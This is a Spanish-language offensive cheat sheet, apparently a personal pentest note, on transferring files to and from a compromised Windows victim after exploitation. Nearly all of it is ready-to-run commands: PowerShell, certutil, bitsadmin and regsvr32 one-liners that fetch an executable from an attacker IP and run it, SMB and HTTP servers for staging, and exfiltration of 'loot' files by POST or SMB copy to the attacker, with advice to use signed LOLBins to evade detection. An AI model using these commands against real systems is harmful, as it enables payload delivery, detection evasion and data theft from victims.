#reference #Ciberseguridad

Transferencia de ficheros a/desde una víctima **Windows** en post-explotación. Infiltración (atacante→víctima) y exfiltración (víctima→atacante). Preferir LOLBins firmados para evadir detección.

# Servir ficheros desde el atacante

```bash
python3 -m http.server 80                    # HTTP
impacket-smbserver share ./ -smb2support     # SMB (útil con copy directo)
# SMB con credenciales:
impacket-smbserver share ./ -smb2support -user u -password p
```

# Infil (descargar a la víctima)

## PowerShell
```powershell
powershell (new-object System.Net.WebClient).DownloadFile('http://1.2.3.4/5.exe','c:\download\a.exe');start-process 'c:\download\a.exe'
iwr -Uri http://1.2.3.4/5.exe -OutFile c:\download\a.exe       # PS 3+
```

## Certutil
```sh
certutil -urlcache -split -f http://1.2.3.4/5.exe c:\download\a.exe&&c:\download\a.exe
```

## bitsadmin
```
bitsadmin /transfer n http://1.2.3.4/5.exe c:\download\a.exe && c:\download\a.exe
```

## regsvr32 (ejecución directa, sin tocar disco visible)
```
regsvr32 /u /s /i:http://1.2.3.4/5.exe scrobj.dll
```

## SMB
```
copy \\1.2.3.4\share\a.exe c:\download\a.exe
```

# Exfil (sacar de la víctima)

```powershell
# POST a un servidor del atacante
Invoke-RestMethod -Uri http://1.2.3.4/up -Method Post -InFile C:\loot.zip

# Vía SMB (montar y copiar)
copy C:\loot.zip \\1.2.3.4\share\

# Base64 por consola (ficheros pequeños / canal limitado)
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\loot.bin"))
```

```bash
# Recibir POST en el atacante
nc -lvnp 80      # o un pequeño servidor que guarde el body
```

> Codificación Base64 útil cuando solo hay un canal de texto (shell sin upload). Para volúmenes grandes, SMB/HTTP. DNS/ICMP como covert channel si todo lo demás está filtrado.

# Recursos
### [[PowerShell_CS]] · [[AVs_Detectors]]
### [HackTricks — Windows file transfers](https://book.hacktricks.xyz/windows-hardening/lateral-movement)
